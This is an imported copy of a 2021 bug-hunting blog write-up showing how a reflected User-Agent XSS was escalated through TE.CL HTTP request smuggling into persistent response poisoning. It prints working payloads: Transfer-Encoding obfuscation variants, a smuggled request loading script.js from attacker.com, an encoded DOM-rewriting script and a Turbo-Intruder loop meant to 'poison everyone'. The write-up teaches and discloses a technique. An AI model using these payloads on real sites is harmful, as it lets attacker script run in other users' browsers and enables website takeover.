@@ -1,0 +1,215 @@
+---
+source: imported
+source_type: markdown
+original_path: knowledge-inbox/blogs-incoming/2021-03-09_alternative-link.md
+original_filename: 2021-03-09_alternative-link.md
+title: Alternative link
+category: documents
+detected_topics:
+- xss
+- command-injection
+- otp
+- automation-abuse
+- race-condition
+- api-security
+tags:
+- imported
+- documents
+- xss
+- command-injection
+- otp
+- automation-abuse
+- race-condition
+- api-security
+language: en
+raw_sha256: ecd2a3013afdcfe9964e72325440bf5f03099f3e64ede9d80b10865a3ea1a215
+text_sha256: 5455132a265f7e64b6f44f10bde310dde517237d0ef7fd735e485a01d4e3ec12
+ingested_at: '2026-06-28T07:32:05Z'
+sensitivity: unknown
+redactions_applied: true
+---
+
+# Alternative link
+
+## Source Metadata
+
+- Original Path: knowledge-inbox/blogs-incoming/2021-03-09_alternative-link.md
+- Source Type: markdown
+- Detected Topics: xss, command-injection, otp, automation-abuse, race-condition, api-security
+- Ingested At: 2026-06-28T07:32:05Z
+- Redactions Applied: True
+- Raw SHA256: `ecd2a3013afdcfe9964e72325440bf5f03099f3e64ede9d80b10865a3ea1a215`
+- Text SHA256: `5455132a265f7e64b6f44f10bde310dde517237d0ef7fd735e485a01d4e3ec12`
+
+
+## Content
+
+---
+title: "Alternative link"
+page_title: "Exploiting HTTP Request Smuggling (TE.CL)— XSS to website takeover | by kleiton0x7e | InfoSec Write-ups"
+url: "https://infosecwriteups.com/exploiting-http-request-smuggling-te-cl-xss-to-website-takeover-c0fc634a661b"
+authors: ["Kleiton Kurti (@kleiton0x7e)"]
+bugs: ["HTTP request smuggling", "XSS"]
+publication_date: "2021-03-09"
+added_date: "2022-09-15"
+source: "pentester.land/writeups.json"
+original_index: 3829
+scraped_via: "browseros"
+---
+
+# Alternative link
+
+Exploiting HTTP Request Smuggling (TE.CL)— XSS to website takeover
+kleiton0x7e
+Follow
+5 min read
+·
+Mar 9, 2021
+
+534
+
+Press enter or click to view image in full size
+
+Even though HTTP Request Smuggling is documented back on 2005, it is still one of the least known Webapp vulnerabilities out there.
+
+After a little break I decided to hunt a private company (which is not eligible for Bug Bounty, but still accepting reports) and what I found might be worth sharing.
+
+Reflected XSS in User-Agent Header
+
+I have developed my own smart XSS fuzzing (which might be soon published) which tests both URL Endpoints and HTTP Headers. Luckily it found that User-Agent is being reflected. We can confirm it by manually send a request with Burp Suite:
+
+Press enter or click to view image in full size
+
+The word Exploitation is being reflected, let’s put a simple XSS and break the Javascript String. The payload will look like this:
+
+“><script>alert(`XSS`)</script>
+
+We got XSS, nothing new and interesting by far. Mostly Private Programs don’t accept this bug as in real cases, you can’t send special-crafted HTTP request to an end user. Let’s try to escalate this innocent-looking XSS into something more spicy.
+
+Recon and Detecting HTTP Request Smuggling
+
+Burp Suite has a built-in Extension for this type of vulnerability, and it does test any kind of Smuggling while I do enumerating.
+
+Now let’s perform automatic scans, go to Repeater, right click and click on Launch Smuggle probe.
+
+If HTTP Smuggling vulnerability is detected, it will be issued on Target tab (it might take some minutes to perform the scans in the background)
+
+Taken from here as I forgot to take a screenshot
+TE.CL Exploit Development
+
+Before we craft our special-request in Burp Suite, go to the Repeater menu and ensure that the “Update Content-Length” option is unchecked, this way our Content-Length value doesn’t automatically change by Burp Suite, this is a crucial part on this kind of exploitation.
+
+Below is our crafted payload. Keep in mind that the 2 headers (Transfer-Encoding, and Connection) must be always included. The first chunk (A*1000) is going to be requested to the front-end server, it contains nothing malicious because it is just a regular request as an ordinary user would do. The reason why Content-length is 1007 (in the photo below is 1005, oops…), is because there are 1000*A + \r\n + 3e8 + b0. Which means 1000 + 2 + 3 + 2 = 1007 bytes. Note: b0 is still considered a part of the first request even though it defines the length of the smuggled request.
+
+The second chunk of data is our smuggled request, if successful, we should get Error 404 requests as there is no directory /404hopefully on the website.
+
+After the second chunk, is mandatory to add x=1 or bunch of random data and two newlines \r\n\r\n after 0.
+
+Get kleiton0x7e’s stories in your inbox
+
+Join Medium for free to get updates from this writer.
+
+Subscribe
+
+Remember me for faster sign in
+
+0\r\n\r\n
+\r\n\r\n
+
+Send this request to Turbo-Intruder and if we get any 404 Request, it means that our Special-Crafted request is sent to Back-End server.
+
+Request going on Back-End server and making a 404 Error
+Suffix Space Bypass — Obfuscating TE Header
+
+We have to obfuscate the TE header, because one of the servers can be induced not to process it. This technique works on quite a few systems, but we can exploit many more by making the Transfer-Encoding header slightly harder to spot, so that one system doesn’t see it. Here are some payloads by James Kettle:
+
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+
+I used whitespace as a bypass method.
+
+Space Suffix Bypass
+Poisoning response and website takeover
+
+I have created a python script which does craft the request automatically. It does the calculation of TE Chunk and Content-Length also. You can check it out here: https://github.com/kleiton0x00/TECL_DesyncCalculator
+
+Note: I slightly edited the script by adding the follow line, so we can inject our XSS in User-Agent header:
+prefix += 'User-Agent: "><script src=http://attacker.com/script.js></script>' + RN
+
+Press enter or click to view image in full size
+
+So the output is our request and I will be our final payload to poison users’ response (I wanted to add 1000*A too, just to make it cooler):
+
+GET / HTTP/1.1
+Transfer-Encoding : chunked
+Host: private.website
+Content-length: 4
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+3e8
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA***REDACTED-SUSPECT-TOKEN***83
+GET / HTTP/1.1
+Host: private.website
+User-Agent: “><script src=http://attacker.com/script.js></script>
+Content-Length: 15
+x=1
+0
+
+Inside script.js is a simple code which generates a HTML website as a POC (kinda serves as a DOM XSS):
+
+document.documentElement.innerHTML=String.fromCharCode(60, 104, 116, 109, 108, 62, 10, 60, 104, 49, 62, 85, 115, 101, 114, 39, 115, 32, 114, 101, 115, 112, 111, 110, 115, 101, 32, 105, 115, 32, 112, 111, 105, 115, 111, 110, 101, 100, 32, 119, 105, 116, 104, 32, 72, 84, 84, 80, 32, 82, 101, 113, 117, 101, 115, 116, 32, 83, 109, 117, 103, 103, 108, 105, 110, 103, 32, 97, 110, 100, 32, 88, 83, 83, 60, 47, 104, 49, 62, 10, 60, 47, 104, 116, 109, 108, 62, 10)
+
+Here is our setup.txt which contains the configuration part of Turbo-Intruder:
+
+#credits to https://hipotermia.pw/bb/http-desync-account-takeover
+def queueRequests(target, wordlists):
+  engine = RequestEngine(endpoint=target.endpoint,
+  concurrentConnections=20,
+  requestsPerConnection=20,
+  resumeSSL=False,
+  timeout=10,
+  pipeline=False,
+  maxRetriesPerRequest=0
+  )
+  engine.start()
+  
+  attack = target.req
+  engine.queue(attack)
+  
+  victim = target.req
+  for i in range(100000000):
+  engine.queue(victim)
+  time.sleep(0.05)
+  
+def handleResponse(req, interesting):
+  table.add(req)
+
+There is nothing much left to do, so fire up Turbo-Intruder and poison everyone:
+
+java -jar turbo-intruder-all.jar setup.txt request.txt https://www.target.com/ /
+Press enter or click to view image in full size
+
+As long as the Turbo-Intruder is being run, the XSS payload will be persistent on the website. Below is Javascript being executed in the website.
+
+Press enter or click to view image in full size
+User’s Response poisoned
+References:
+
+https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
+https://portswigger.net/web-security/request-smuggling
+https://www.youtube.com/watch?v=JW2fM_GmidU&t=1s
